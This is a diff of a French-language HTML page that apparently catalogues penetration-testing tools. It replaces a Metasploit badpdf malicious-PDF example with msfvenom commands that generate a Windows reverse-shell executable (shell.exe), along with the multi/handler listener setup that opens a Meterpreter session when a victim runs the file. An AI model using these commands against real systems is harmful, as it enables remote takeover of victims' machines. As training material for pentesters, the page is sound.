@@ -133,26 +133,35 @@ pre code {
         </header>
 
         <section class="tool-section">
-            <div class="tool-entry" id="metasploit"> 
-                <div>
-                    <h2>Metasploit</h2>
-                    <p>Utilisé pour générer des reverse shells et exploiter des failles connues à travers divers payloads.</p>
-                    <h3>Exemple : Exploitation via le module <code>fileformat/badpdf</code></h3>
-                    <p>
-                        Ce module génère un fichier PDF malveillant qui, lorsqu’il est ouvert, exécute un payload sur la machine cible.
-                    </p>
-                    <pre><code>
-            use exploit/multi/fileformat/badpdf
-            set payload windows/meterpreter/reverse_tcp
-            set LHOST 10.10.14.24
-            set LPORT 4444
-            exploit
-                    </code></pre>
-                    <p>
-                        Une fois le PDF généré et ouvert par la victime, une session Meterpreter est établie vers l'attaquant.
-                    </p>
-                </div>
-            </div>
+    <div class="tool-entry" id="metasploit-exe"> 
+        <div>
+            <h2>Metasploit</h2>
+            <p>Utilisé pour générer des reverse shells et exploiter des failles connues à travers divers payloads.</p>
+            <h3>Exemple : Génération d'un exécutable malveillant</h3>
+            <p>
+                Cet exemple utilise <code>msfvenom</code> pour créer un exécutable Windows contenant un payload reverse shell.
+                Une fois exécuté sur la machine cible, il établit une connexion vers l’attaquant.
+            </p>
+            <pre><code>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.23.11 LPORT=4444 -f exe -o shell.exe
+            </code></pre>
+            <p>
+                Ensuite, on écoute la connexion avec Metasploit :
+            </p>
+            <pre><code>
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.23.11
+set LPORT 4444
+exploit
+            </code></pre>
+            <p>
+                Lorsque la victime exécute le fichier <code>shell.exe</code>, une session Meterpreter est ouverte sur la machine de l’attaquant.
+            </p>
+        </div>
+    </div>
+</section>
+
             
 
             <div class="tool-entry" id="rubeus"> 
